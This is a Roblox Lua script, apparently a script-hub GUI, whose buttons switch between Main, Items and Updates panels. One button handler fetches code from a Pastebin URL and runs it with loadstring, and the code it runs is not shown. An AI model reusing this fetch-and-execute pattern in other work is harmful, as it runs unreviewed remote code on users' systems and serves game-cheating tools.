local function JGCZ_fake_script() -- OpenBtn_12.LocalScript 
	local script = Instance.new('LocalScript', OpenBtn_12)

	-- LocalScript inside the TextButton
	
	script.Parent.MouseButton1Click:Connect(function()
		local success, result = pcall(function()
			loadstring(game:HttpGet("https://pastebin.com/raw/YdZML1p4"))()
		end)
	
		if not success then
			warn("Error loading script: " .. result)
		else
			print("Script loaded successfully.")
		end
	end)
end
coroutine.wrap(JGCZ_fake_script)()
local function ODHDIZ_fake_script() -- ItemsButton.LocalScript 
	local script = Instance.new('LocalScript', ItemsButton)

	local button = script.Parent
	local hub = button.Parent
	
	-- Constants (Must be shared across all toggle scripts for consistent behavior)
	local OPEN_ZINDEX = 5
	local CLOSED_ZINDEX = 1
	local WHITE = Color3.fromRGB(255, 255, 255)
	
	-- Define targets, grouping related Frame/Button pairs
	-- Note: We must define all three pairs here for coordination
	local targetGroups = {
		Main = {Frame = hub:FindFirstChild("MainFrame"), Button = hub:FindFirstChild("MainButton")},
		Items = {Frame = hub:FindFirstChild("ItemsFrame"), Button = button}, -- This button controls this frame
		Updates = {Frame = hub:FindFirstChild("UpdatesFrame"), Button = hub:FindFirstChild("UpdatesButton")},
	}
	
	-- Basic safety check
	if not targetGroups.Main.Frame or not targetGroups.Items.Frame or not targetGroups.Updates.Frame then
		warn("Toggle Script (Items): One or more essential UI elements are missing.")
		return
	end
	
	local function onButtonClicked()
		local itemsIsCurrentlyOpen = targetGroups.Items.Frame.Visible
		local nextStateIsClosed = itemsIsCurrentlyOpen -- If it's currently open, the next click closes it
	
		if nextStateIsClosed then
			-- Action: CLOSE ItemsFrame. When closing, all panels must be closed.
			targetGroups.Items.Frame.Visible = false
			targetGroups.Items.Frame.ZIndex = CLOSED_ZINDEX
	
			-- Un-highlight all buttons since no panel is active
			for _, group in pairs(targetGroups) do
				group.Button.TextColor3 = WHITE
			end
	
		else
			-- Action: OPEN ItemsFrame and close all others.
	
			-- 1. Iterate and coordinate all panels (Main, Items, Updates)
			for name, group in pairs(targetGroups) do
				local isTarget = (name == "Items")
	
				-- Set visibility and ZIndex
				group.Frame.Visible = isTarget
				group.Frame.ZIndex = isTarget and OPEN_ZINDEX or CLOSED_ZINDEX
	
				-- Set button color (Highlight/un-highlight state)
				group.Button.TextColor3 = WHITE
			end
		end
	
	
	end
	
	button.MouseButton1Click:Connect(onButtonClicked)
end
coroutine.wrap(ODHDIZ_fake_script)()
local function XLPT_fake_script() -- MainButton.LocalScript 
	local script = Instance.new('LocalScript', MainButton)

	local button = script.Parent
	local hub = button.Parent
	
	-- Constants
	local OPEN_ZINDEX = 5
	local CLOSED_ZINDEX = 1
	local WHITE = Color3.fromRGB(255, 255, 255) -- Used for both highlight and un-highlight in original logic
	
	-- Define targets, grouping related Frame/Button pairs
	local targetGroups = {
		Main = {Frame = hub:FindFirstChild("MainFrame"), Button = button},
		Items = {Frame = hub:FindFirstChild("ItemsFrame"), Button = hub:FindFirstChild("ItemsButton")},
		Updates = {Frame = hub:FindFirstChild("UpdatesFrame"), Button = hub:FindFirstChild("UpdatesButton")},
	}
	
	-- Basic safety check
	if not targetGroups.Main.Frame or not targetGroups.Items.Frame or not targetGroups.Updates.Frame then
		warn("Toggle Script (Main): One or more essential UI elements are missing.")
		return
	end
	
	local function onButtonClicked()
		-- List of panels to close (Items and Updates)
		local panelsToClose = {targetGroups.Items, targetGroups.Updates}
	
		-- 1. Close all other coordinated panels and un-highlight their buttons
		for _, group in ipairs(panelsToClose) do
			group.Frame.Visible = false
			group.Frame.ZIndex = CLOSED_ZINDEX
			group.Button.TextColor3 = WHITE
		end
	
		-- 2. Open MainFrame and highlight this button
		targetGroups.Main.Frame.Visible = true
		targetGroups.Main.Frame.ZIndex = OPEN_ZINDEX
		targetGroups.Main.Button.TextColor3 = WHITE -- Highlight self
	
	
	end
	
	button.MouseButton1Click:Connect(onButtonClicked)
end
coroutine.wrap(XLPT_fake_script)()
